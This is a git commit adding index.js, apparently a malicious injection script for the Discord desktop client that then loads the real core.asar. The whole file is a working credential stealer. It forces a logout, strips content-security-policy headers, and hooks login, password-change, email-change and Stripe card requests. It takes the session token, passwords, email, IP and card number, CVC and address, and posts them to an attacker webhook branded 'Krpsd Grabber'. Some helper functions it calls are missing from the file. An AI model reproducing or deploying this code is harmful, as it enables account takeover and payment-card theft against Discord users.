cd65ff7d6373f7af28595b6e55d58ad94b7f6d6f
fatih00114 <58105140+fatih00114@users.noreply.github.com>
2022-01-29 18:50:33 +0300

    Create index.js

---
+++ index.js
@@ -0,0 +1,278 @@
+const fs = require('fs');
+const path = require('path');
+const { BrowserWindow, session } = require('electron')
+const querystring = require('querystring');
+var webhook = "%WEBHOOK_LINK%";
+
+function FirstTime() {
+    if (!fs.existsSync(path.join(__dirname, "Krpsd"))) {
+        return !0
+    }
+    fs.rmdirSync(path.join(__dirname, "Krpsd"));
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
+    return !1
+}
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+	if (details.url.startsWith(webhook)) {
+		if (details.url.includes("discord.com")) {
+			callback({
+				responseHeaders: Object.assign({
+					'Access-Control-Allow-Headers': "*"
+				}, details.responseHeaders)
+			});
+		} else {
+			callback({
+				responseHeaders: Object.assign({
+					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
+					'Access-Control-Allow-Headers': "*",
+					"Access-Control-Allow-Origin": "*"
+				}, details.responseHeaders)
+			});
+		}
+
+
+	} else {
+		delete details.responseHeaders['content-security-policy'];
+		delete details.responseHeaders['content-security-policy-report-only'];
+
+		callback({
+			responseHeaders: {
+				...details.responseHeaders,
+				'Access-Control-Allow-Headers': "*"
+			}
+		})
+	}
+
+})
+const Filter = {
+	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
+}
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+	if (details.url.startsWith("wss://")) {
+			callback({
+				cancel: true
+			})
+			return;
+	}
+	if (FirstTime()) {}
+
+	callback({})
+	return;
+})
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+    if (FirstTime())
+        if (details.url.startsWith("wss://")) {
+            callback({
+                cancel: !0
+            })
+        } else {
+            callback({
+                cancel: !1
+            })
+        }
+})
+function SendToWebhook(what) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${webhook}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, !0).then((token => {}))
+}
+
+
+function Login(email, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        const json = JSON.parse(info);
+        var params = {
+            username: "Krpsd Grabber",
+            content: "",
+            avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
+            embeds: [
+                {
+                    "color": 16507654,
+                    "fields": [
+                        {
+                            "name": "**Account Info**",
+                            "value": `Email: ${email} - Password: ${password}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "**Token**",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": "Discord Token Grabber by krpsd"
+                    }
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
+
+function ChangePassword(oldpassword, newpassword, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+            const json = JSON.parse(info);
+            var params = {
+                username: "Krpsd Grabber",
+                content: "",
+                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
+                embeds: [
+                    {
+                        "color": 16507654,
+                        "fields": [
+                            {
+                                "name": "**Password Changed**",
+                                "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": json.username +"#" + json.discriminator + "・" + json.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Discord Token Grabber by krpsd"
+                        }                 
+                    }
+                ]
+            }
+        SendToWebhook(JSON.stringify(params))
+        })
+    })
+}
+
+function ChangeEmail(newemail, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+            var params = {
+                username: "Krpsd Grabber",
+                content: "",
+                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
+                embeds: [
+                    {
+                        "color": 16507654,
+                        "fields": [
+                            {
+                                "name": "**Email Changed**",
+                                "value": `New Email: ${newemail}\nPassword: ${password}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": json.username +"#" + json.discriminator + "・" + json.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Discord Token Grabber by krpsd"
+                        }                
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params))
+        })
+    })
+}
+
+
+const ChangePasswordFilter = {
+	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
+};
+session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
+	if (details.url.endsWith("login")) {
+		if (details.statusCode == 200) {
+			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+			const email = data.login;
+			const password = data.password;
+			const window = BrowserWindow.getAllWindows()[0];
+			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+				Login(email, password, token)
+			}))
+		} else {}
+	}
+	if (details.url.endsWith("users/@me")) {
+		if (details.statusCode == 200 && details.method == "PATCH") {
+			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+			if (data.password != null && data.password != undefined && data.password != "") {
+				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
+					const window = BrowserWindow.getAllWindows()[0];
+					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+						ChangePassword(data.password, data.new_password, token)
+					}))
+				}
+				if (data.email != null && data.email != undefined && data.email != "") {
+					const window = BrowserWindow.getAllWindows()[0];
+					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+						ChangeEmail(data.email, data.password, token)
+					}))
+				}
+			}
+		} else {}
+	}
+	if (details.url.endsWith("tokens")) {
+		const window = BrowserWindow.getAllWindows()[0];
+		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
+		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
+		}))
+	}
+});
+module.exports = require('./core.asar')
